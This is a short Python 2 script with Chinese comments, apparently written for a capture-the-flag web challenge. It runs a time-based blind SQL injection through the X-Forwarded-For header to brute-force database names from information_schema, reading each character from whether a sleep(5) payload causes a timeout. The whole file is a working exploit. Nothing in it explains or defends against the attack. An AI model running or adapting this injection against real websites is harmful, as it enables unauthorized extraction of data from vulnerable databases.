# -*- coding:utf-8 -*-  
import requests
import string 
url = "http://ctf5.shiyanbar.com/web/wonderkun/index.php"
guess = string.lowercase+string.uppercase+string.digits+string.punctuation
database=[]

for database_number in range(0,100):        #假设爆破前100个库
    databasename=''
    for i in range(1,100):                  #爆破字符串长度，假设不超过100长度
        flag=0
        for str in guess:                   #爆破该位置的字符
            #print 'trying ',str
            headers = {"X-forwarded-for":"'+"+" (select case when (substring((select schema_name from information_schema.SCHEMATA limit 1 offset %d) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1"%(database_number,i,str)}
            try:
                res=requests.get(url,headers=headers,timeout=4)
                print "出现",str
            except:
                databasename+=str
                flag=1
                print '正在扫描第%d个数据库名，the databasename now is '%(database_number+1) ,databasename
                break
        if flag==0:
            break
    database.append(databasename)
    if i==1 and flag==0:
        print '扫描完成'
        break

for i in range(len(database)):
    print database[i]